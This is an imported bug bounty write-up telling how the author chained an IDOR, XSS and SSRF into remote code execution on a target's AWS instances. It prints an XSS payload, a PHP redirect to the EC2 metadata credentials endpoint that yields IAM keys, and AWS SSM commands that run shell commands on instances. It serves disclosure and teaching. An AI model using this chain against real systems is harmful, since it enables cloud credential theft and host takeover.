---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-09-04_how-i-found-my-first-ssrf-to-rce.md
original_filename: 2022-09-04_how-i-found-my-first-ssrf-to-rce.md
title: How I found my first SSRF to RCE!
category: documents
detected_topics:
- cloud-security
- ssrf
- idor
- xss
- command-injection
- otp
tags:
- imported
- documents
- cloud-security
- ssrf
- idor
- xss
- command-injection
- otp
language: en
raw_sha256: 9cb929deb62593a0c0f89d767d858a205d56fee3b3ffe7ec78b718f98502eed4
text_sha256: 407a56cb168f26f9d6669c6b43d25ee1405654e1176fd52289319958c16ddb08
ingested_at: '2026-06-28T07:32:14Z'
sensitivity: unknown
redactions_applied: true
---

# How I found my first SSRF to RCE!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-09-04_how-i-found-my-first-ssrf-to-rce.md
- Source Type: markdown
- Detected Topics: cloud-security, ssrf, idor, xss, command-injection, otp
- Ingested At: 2026-06-28T07:32:14Z
- Redactions Applied: True
- Raw SHA256: `9cb929deb62593a0c0f89d767d858a205d56fee3b3ffe7ec78b718f98502eed4`
- Text SHA256: `407a56cb168f26f9d6669c6b43d25ee1405654e1176fd52289319958c16ddb08`


## Content

---
title: "How I found my first SSRF to RCE!"
url: "https://medium.com/@0x0Asif/how-i-found-my-first-rce-8f8033883dc4"
authors: ["Md. Asif Hossain (@0x0asif)"]
bugs: ["IDOR", "SSRF", "RCE"]
bounty: "3,200"
publication_date: "2022-09-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2221
scraped_via: "browseros"
---

# How I found my first SSRF to RCE!

How I found my first SSRF to RCE!
Md. Asif Hossain
Follow
3 min read
·
Sep 4, 2022

521

8

Hi Guys,

I always believed that sharing is caring, So I decided to share my recent finding with you as it might help others who started on the Bug Bounty journey. Today I will tell you how I found my first RCE.

During my hunting, I found an IDOR and was able to see all visitor PII Including pictures.

IDOR Request:

GET /visitors/?start_date=01/01/2021&end_date=07/23/2022&first_name=&last_name=&date_of_birth=&status=&reason_for_visit=&reason_for_visit_text=&start_record=0&total_record=10&selected_building_id=&building_id=1266 HTTP/2
Host: subs.example.io

“building_id” Parameter are vulnerable to IDOR. This Parameter value is a numeric value, So it's easy to grab other user's information. When I was checking the user's information, I notice that there was one link example: https://subs.example.io/s3File?url=https://s3-us-west-1.amazon.com/filename.jpeg , It fetching user images from amazon s3 bucket. Now my full attention was there. Because it was Juicy endpoint with ?url= parameter.

Press enter or click to view image in full size

The first step

I tried https://subs.example.io/s3File?url=https://google.com/. Bingo, it's showing the google index page. Then I tried to print something there, but when I tried to print something else it was not working, Further investigation I notice “?url=” it allows only the index page. Then I host this code on a server and I got XSS there.

“><img src=x onerror=alert(document.domain);>{{7*7}}

I report it on h1 and HackerOne triage updated the severity to Medium (4.7).

One day later

I was able to escalate this to full-read SSRF.

Get Md. Asif Hossain’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

As I mentioned above “?url=” Parameter only allowed index. I host this code to my server index

<?php header(‘Location: https://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-service-role-ssm-codedeploy', TRUE, 303); ?>

Obtaining the AWS keys: https://subs.example.io/s3File?url=https://ssrf.hosted.site/

Press enter or click to view image in full size

I got full-read SSRF to root RCE on any AWS instance

Now I have to Configure AWS CLI

export ***REDACTED-AWS-KEY***_ID=
export ***REDACTED-AWS-KEY***_ACCESS_KEY=
export AWS_DEFAULT_REGION=us-west-1
export AWS_SESSION_TOKEN=

Now apply this command aws ssm describe-instance-information — output text — query “InstanceInformationList[*]” to figure out all the instance and copy any of instance which format is like i-0a9e9b8343511285db9

Now apply this command with instanceid

aws ssm send-command — document-name “AWS-RunShellScript” — comment “RCE” — targets “Key=instanceids,Values=instanceid” — parameters ‘commands=uname -a’

Press enter or click to view image in full size

HackerOne triage updated the severity from Medium (4.7) to High (8.8).

HackerOne triage updated the severity from High (8.8) to Critical (9.6).

Bounty: $3200

Follow me: HackerOne & Twitter
